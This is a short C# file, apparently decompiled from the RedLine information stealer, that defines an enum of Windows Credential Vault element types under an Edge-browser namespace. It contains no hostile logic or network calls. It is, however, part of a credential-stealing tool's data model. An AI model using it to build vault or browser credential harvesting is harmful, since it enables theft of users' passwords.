namespace RedLine.Models.Browsers.Edge
{
  public enum VAULT_ELEMENT_TYPE
  {
    Undefined = -1, // 0xFFFFFFFF
    Boolean = 0,
    Short = 1,
    UnsignedShort = 2,
    Int = 3,
    UnsignedInt = 4,
    Double = 5,
    Guid = 6,
    String = 7,
    ByteArray = 8,
    TimeStamp = 9,
    ProtectedArray = 10, // 0x0000000A
    Attribute = 11, // 0x0000000B
    Sid = 12, // 0x0000000C
    Last = 13, // 0x0000000D
  }
}
